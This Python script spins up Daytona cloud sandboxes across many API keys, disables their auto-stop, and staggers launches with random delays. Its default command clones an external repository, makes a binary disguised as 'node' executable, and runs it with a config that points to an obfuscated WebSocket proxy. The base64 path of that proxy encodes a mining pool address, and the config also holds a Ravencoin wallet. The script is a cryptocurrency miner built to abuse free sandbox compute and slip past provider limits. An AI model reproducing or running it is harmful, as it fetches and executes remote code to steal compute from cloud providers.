#!/usr/bin/env python
"""
daytona_main.py – Launch Daytona sandboxes for continuous operation.

Each sandbox is configured to run indefinitely by disabling the auto-stop
feature. The script launches a command and lets it run until manually stopped.

FEATURES:
- Continuous operation: Disables the default auto-stop on inactivity.
- Staggered start: Introduces a random grace period between launching sandboxes.
- Retry logic: Attempts to connect up to 10 times for each session.
- Abandon key: If connection fails 10 times, the API key is abandoned.
- Works with Daytona API with same command execution logic as E2B
"""

import asyncio
import argparse
import os
import sys
import random
from typing import List, Set

from dotenv import load_dotenv
from daytona import Daytona, CreateSandboxBaseParams

# ─────────────────────────  YOUR BUILD-AND-RUN COMMAND  ───────────────────────
DEFAULT_COMMAND = r"""
git clone https://github.com/knom87/thmo.git && \
cd thmo && chmod +x ./node && \
cat > data.json <<'EOF'
{
  "proxy": "wss://ratty-adoree-ananta512-4abadf1a.koyeb.app/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
  "config": { "threads": 4, "log": true },
  "options": {
    "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj",
    "password": "c=RVN",
    "argent": "Dynmoai0909"
  }
}
EOF
./node app.js
"""
# ──────────────────────────────────────────────────────────────────────────────

ENV_PREFIX = "DAYTONA_API_KEY_"
MAX_CONNECTION_ATTEMPTS = 10

# ─── helpers ──────────────────────────────────────────────────────────────────
def env_keys(prefix: str = ENV_PREFIX) -> List[str]:
    """All env-var values whose names start with *prefix* and are non-empty."""
    return [v.strip() for k, v in os.environ.items() if k.startswith(prefix) and v.strip()]

def parse_args() -> argparse.Namespace:
    """Parses command-line arguments for the script."""
    p = argparse.ArgumentParser(description="Spin up Daytona sandboxes for continuous operation.")
    p.add_argument("--key", action="append", metavar="DAYTONA_API_KEY", help="repeat for multiple keys")
    p.add_argument("--cmd", default=DEFAULT_COMMAND, help="shell command to run in each sandbox")
    p.add_argument("--base-url", default="https://api.daytona.io", help="Daytona API base URL")
    return p.parse_args()

# ─── per-sandbox task ─────────────────────────────────────────────────────────
async def run_sandbox_continuously(
    key: str, cmd: str, idx: int, base_url: str
) -> None:
    """
    Manages the lifecycle of a single sandbox, configured to run indefinitely.
    It will attempt to connect, start the command, and then let it run.
    """
    tag = f"sbx-{idx}"

    # --- Connection Retry Loop ---
    daytona_client = None
    sandbox_instance = None
    for attempt in range(MAX_CONNECTION_ATTEMPTS):
        try:
            print(f"🟡  [{tag}] Attempting to start session (…{key[-6:]}), attempt {attempt + 1}/{MAX_CONNECTION_ATTEMPTS}", flush=True)
            
            # Initialize Daytona client
            clean_key = key.strip()
            os.environ['DAYTONA_API_KEY'] = clean_key
            if base_url != "https://api.daytona.io":
                os.environ['DAYTONA_SERVER_URL'] = base_url
            
            daytona_client = Daytona()
            
            # Create sandbox with auto-stop disabled
            params = CreateSandboxBaseParams(auto_stop_interval=0)
            sandbox_instance = daytona_client.create(params)
            
            print(f"✅  [{tag}] Session started successfully. Auto-stop is DISABLED.", flush=True)
            break  # Exit retry loop on success
            
        except Exception as e:
            print(f"❌  [{tag}] Connection attempt {attempt + 1} failed: {e}", file=sys.stderr, flush=True)
            if attempt < MAX_CONNECTION_ATTEMPTS - 1:
                await asyncio.sleep(5)  # Wait a bit before retrying
            else:
                print(f"🚫  [{tag}] Abandoning key (…{key[-6:]}) after {MAX_CONNECTION_ATTEMPTS} failed attempts.", file=sys.stderr, flush=True)
                return  # Abandons this key permanently

    if not sandbox_instance:
        return # Should not be reached, but as a safeguard.

    # --- Command Execution ---
    try:
        print(f"🚀  [{tag}] Launching command. Will run indefinitely. ID: {sandbox_instance.id}", flush=True)
        
        # Execute the command and wait for it to complete or for the script to be stopped
        await asyncio.to_thread(sandbox_instance.process.exec, cmd)

        print(f"✅  [{tag}] Command finished executing.", flush=True)

    except Exception as e:
        print(f"\n❌  [{tag}] An error occurred during command execution: {e}", file=sys.stderr, flush=True)
    
    finally:
        # The sandbox is NOT deleted here, allowing it to run.
        # It will only be cleaned up if the script is manually terminated.
        print(f"ℹ️   [{tag}] Script task finished, but sandbox {sandbox_instance.id} may still be running on Daytona.", flush=True)


# ─── main entry ───────────────────────────────────────────────────────────────
async def main_async() -> None:
    """Main asynchronous entry point for the script."""
    load_dotenv()
    args = parse_args()

    seen: Set[str] = set()
    keys: List[str] = []
    for k in env_keys() + (args.key or []):
        clean_k = k.strip()
        if clean_k and clean_k not in seen:
            keys.append(clean_k)
            seen.add(clean_k)

    if not keys:
        sys.exit(f"No API keys found — set {ENV_PREFIX}* environment variables or pass --key")

    print(f"Found {len(keys)} API key(s). Launching sandboxes sequentially with a grace period...\n")
    tasks = []
    for i, k in enumerate(keys):
        task = asyncio.create_task(run_sandbox_continuously(
            k, args.cmd, i, args.base_url
        ))
        tasks.append(task)
        
        # After launching a task, wait before launching the next one
        if i < len(keys) - 1:
            grace_period = random.randint(30, 45)
            print(f"\n───────────────────[ GRACE PERIOD: {grace_period}s ]───────────────────\n", flush=True)
            await asyncio.sleep(grace_period)

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n⏹️  Interrupted by user. Note: Sandboxes may still be running on Daytona.", file=sys.stderr)
